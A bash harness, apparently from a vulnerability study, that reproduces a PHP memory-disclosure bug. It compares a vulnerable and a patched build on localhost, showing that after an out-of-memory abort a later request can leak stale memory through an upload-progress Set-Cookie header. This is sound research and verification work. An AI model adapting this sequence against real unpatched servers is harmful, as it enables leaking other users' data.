#!/usr/bin/env bash
#
# One-command stage-2 walkthrough: what an OOM-aborted request leaves behind for
# the next request on the same worker.
#
# The control runs FIRST, because the tests that follow poison the worker -- a
# fresh-worker reading taken afterwards is worthless.
#
#   ./fetch-php.sh 8.4.26 fpm-alpine3.23
#   ./fetch-php.sh 8.4.27 fpm-alpine3.23
#   ./stage2.sh
#
set -u
cd "$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

VP=8526                 # vulnerable
PP=8527                 # patched
RUN_V=8.4.26-fpm-alpine3.23
RUN_P=8.4.27-fpm-alpine3.23
MEM=128M
WORKERS=4

V_PID=""; P_PID=""
cleanup() { [ -n "$V_PID" ] && kill "$V_PID" 2>/dev/null; [ -n "$P_PID" ] && kill "$P_PID" 2>/dev/null; }
trap cleanup EXIT

hr()  { printf '\n\033[1m%s\033[0m\n' "$*"; }
serve() { PHP_CLI_SERVER_WORKERS=$WORKERS ./phpv.sh "$1" -d memory_limit=$MEM \
            -d display_errors=1 -d error_reporting=E_ALL -S "127.0.0.1:$2" -t www \
            >/dev/null 2>&1 & }

# Wait for a server to actually answer, rather than sleeping and hoping.
wait_up() {
  for _ in $(seq 1 40); do
    curl -sf -m 2 "http://127.0.0.1:$1/diag.php" >/dev/null 2>&1 && return 0
    sleep 0.5
  done
  echo "  !! 127.0.0.1:$1 never came up" >&2
  return 1
}

hr "STEP 0 - runtimes"
for r in "$RUN_V" "$RUN_P"; do
  if ./phpv.sh "$r" -v >/dev/null 2>&1; then
    printf '   %-28s %s\n' "$r" "$(./phpv.sh "$r" -v 2>/dev/null | head -1)"
  else
    echo "   $r missing -- run: ./fetch-php.sh ${r%%-*} fpm-alpine3.23" >&2
    exit 1
  fi
done
echo "   memory_limit=$MEM   PHP_CLI_SERVER_WORKERS=$WORKERS"

hr "STEP 1 - start both builds, only the PHP version differs"
serve "$RUN_V" $VP; V_PID=$!
serve "$RUN_P" $PP; P_PID=$!
wait_up $VP || exit 1
wait_up $PP || exit 1
echo "   vulnerable -> http://127.0.0.1:$VP  (pid $V_PID)"
echo "   patched    -> http://127.0.0.1:$PP  (pid $P_PID)"

hr "STEP 2 - is the observable even reachable?"
echo "   The leaked value arrives in a Set-Cookie header, so the upload-progress"
echo "   callback must be wired up. diag.php answers that before we trust anything:"
curl -s -m 5 "http://127.0.0.1:$VP/diag.php" | sed 's/^/     /'

hr "STEP 3 - CONTROL: a worker that has never been OOM'd"
echo "   Same request shapes as step 4. Expect 32-byte ids and no fatals."
python3 stage2.py --port $VP fresh --reps 8 | sed 's/^/     /'
python3 stage2.py --port $PP fresh --reps 8 | sed 's/^/     /'

hr "STEP 4 - now let one OOM land first, then ask again (vulnerable)"
python3 stage2.py --port $VP after --reps 20 | sed 's/^/     /'

hr "STEP 5 - the pairing changes which symptom appears"
echo "   A different producer geometry, same two bugs:"
python3 stage2.py --port $VP after --reps 10 --producer heap | sed 's/^/     /'

hr "STEP 6 - the emitted length tracks our input"
python3 stage2.py --port $VP sweep --reps 5 | sed 's/^/     /'

hr "STEP 7 - the SAME sequence against the patched build"
echo "   The producer no longer exhausts memory, so there is no stale state to reuse."
python3 stage2.py --port $PP after --reps 20 | sed 's/^/     /'

hr "DONE - reading the output"
echo "   'CLEAN'    every id was 32 bytes, no fatals  (the control)"
echo "   'ANOMALY'  the follow-up read stale memory: either an id that is not 32"
echo "              bytes, or a corrupted allocation size taken from stale memory"
echo
echo "   Full reasoning, patch ground truth and the parts that did NOT reproduce:"
echo "   docs/ANALYSIS.md section 6"
